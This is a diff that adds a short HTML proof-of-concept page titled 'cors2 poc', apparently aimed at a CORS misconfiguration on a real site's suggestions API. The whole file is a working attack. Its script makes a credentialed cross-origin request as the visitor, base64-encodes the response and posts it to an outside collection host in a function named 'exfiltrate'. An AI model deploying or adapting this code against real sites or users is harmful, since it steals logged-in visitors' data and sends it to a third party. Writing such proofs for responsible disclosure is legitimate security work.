@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h2>cors2 poc</h2>
+
+  <script>
+  function exfiltrate(data) {
+    fetch("https://hey.bild.de.mzero.cloud/leak", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ key: btoa(data) })  // base64 encode to avoid issues
+    }).catch(err => console.error("Exfiltration failed", err));
+  }
+
+  var req = new XMLHttpRequest();
+  req.open('GET', 'https://hey.bild.de/api/suggestions', true);
+  req.withCredentials = true;
+  req.onreadystatechange = function () {
+    if (req.readyState === 4) {
+      exfiltrate(req.responseText);
+    }
+  };
+  req.send();
+</script>
+
+</body>
+</html>
